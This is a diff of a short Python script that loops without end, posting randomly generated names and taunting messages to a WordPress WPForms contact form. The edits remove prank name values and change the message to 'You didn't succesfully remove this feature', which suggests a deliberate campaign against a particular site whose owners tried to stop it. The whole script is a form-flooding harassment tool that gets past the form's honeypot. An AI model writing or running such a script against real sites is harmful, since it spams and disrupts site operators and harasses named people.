@@ -20,15 +20,11 @@ while True:
         l = chr(random.randint(97, 122))
         lastname += l
 
-    firstname = "Sorry My dudes"
-    lastname = "GET PRANKD"
-    username = "My apologies"
-
     requests.post(url, allow_redirects=False, data={
         'wpforms[fields][0][first]': firstname,
         'wpforms[fields][0][last]': lastname,
         'wpforms[fields][1]': "{}@{}.com".format(firstname, lastname),
-        'wpforms[fields][2]': "Sorry molly Im only doing this to annoy peggy *Dibbedy Dabbedy*",
+        'wpforms[fields][2]': "You didn't succesfully remove this feature",
         'wpforms[fields][3]': "I consent to having this website store my submitted information so they can respond to my inquiry.",
         'wpforms[hp]': None,
         'wpforms[id]': 296,
@@ -37,4 +33,4 @@ while True:
         'wpforms[submit]': "wpforms-submit"
     })
 
-    print('sending username %s' % username)
+    print('sending username: '+ username+ ', firstname: '+ firstname + ',   lastname: '+lastname)
